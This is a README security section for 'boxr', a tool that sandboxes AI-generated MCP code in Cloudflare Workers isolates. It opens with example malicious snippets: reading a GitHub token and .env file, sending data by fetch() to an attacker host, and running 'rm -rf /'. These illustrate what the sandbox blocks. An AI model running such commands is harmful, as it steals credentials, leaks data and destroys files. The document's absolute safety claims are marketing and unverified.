# Security Section for README

## ğŸ”’ Security: Why Isolates Matter

Running AI-generated code is inherently risky. **boxr** (or your chosen name) uses Cloudflare Workers isolates to create a zero-trust execution environment where even malicious code can't escape the sandbox.

### The Problem with Traditional MCP Execution

When AI agents execute MCP tools directly, malicious or buggy code can:

```typescript
// âŒ Steal credentials
console.log(process.env.GITHUB_TOKEN);

// âŒ Exfiltrate data over the network  
await fetch('https://attacker.com/steal', {
  body: JSON.stringify(sensitiveData)
});

// âŒ Access the filesystem
const secrets = require('fs').readFileSync('.env', 'utf8');

// âŒ Execute arbitrary commands
require('child_process').exec('rm -rf /');
```

### How boxr Protects You

**boxr** runs all code in isolated Workers with three layers of security:

#### 1. **Network Isolation** 
```typescript
globalOutbound: null  // All fetch() calls blocked
```
âœ… No data exfiltration  
âœ… No SSRF attacks  
âœ… No unauthorized API calls

#### 2. **Credential Hiding**
API keys never enter the isolate. MCP bindings handle authentication transparently.

âœ… No credential theft  
âœ… No secret leakage  
âœ… No token exposure

#### 3. **Sandboxed Execution**
No filesystem, no process access, no Node.js APIs.

âœ… No file system access  
âœ… No command execution  
âœ… No system manipulation

### Security Comparison

| Attack Vector | Traditional MCP | boxr (Workers Isolates) |
|--------------|-----------------|-------------------------|
| **Network data theft** | âš ï¸ Vulnerable | âœ… **Blocked** |
| **Credential leakage** | âš ï¸ Vulnerable | âœ… **Impossible** |
| **File system access** | âš ï¸ Vulnerable | âœ… **Blocked** |
| **SSRF attacks** | âš ï¸ Vulnerable | âœ… **Blocked** |
| **Code injection** | âŒ No protection | âœ… **Validated** |
| **Resource exhaustion** | âš ï¸ Limited protection | âœ… **Hard limits** |

### Real-World Impact

**Even if an AI agent generates malicious code, it cannot:**
- âŒ Steal data over the network
- âŒ Access your API keys or secrets
- âŒ Read or write files on your system
- âŒ Execute shell commands
- âŒ Access internal services (SSRF)
- âŒ Affect other executions

**It can only:**
- âœ… Call the specific MCP operations you've explicitly allowed
- âœ… Process data within its memory sandbox
- âœ… Return results via `console.log()`

### The Bottom Line

**boxr creates a zero-trust execution environment.** Every execution runs in a fresh, disposable V8 isolate with:
- ğŸ”’ No network access
- ğŸ”’ No credentials
- ğŸ”’ No filesystem
- ğŸ”’ Resource limits (CPU, memory, time)
- ğŸ”’ Complete isolation from other executions

This makes it **safe to execute AI-generated code**, even from untrusted sources, while maintaining the performance benefits of code mode execution.

---

*Want to learn more? See our [Security Analysis](./docs/SECURITY_ANALYSIS.md) for detailed attack vector breakdowns and mitigation strategies.*
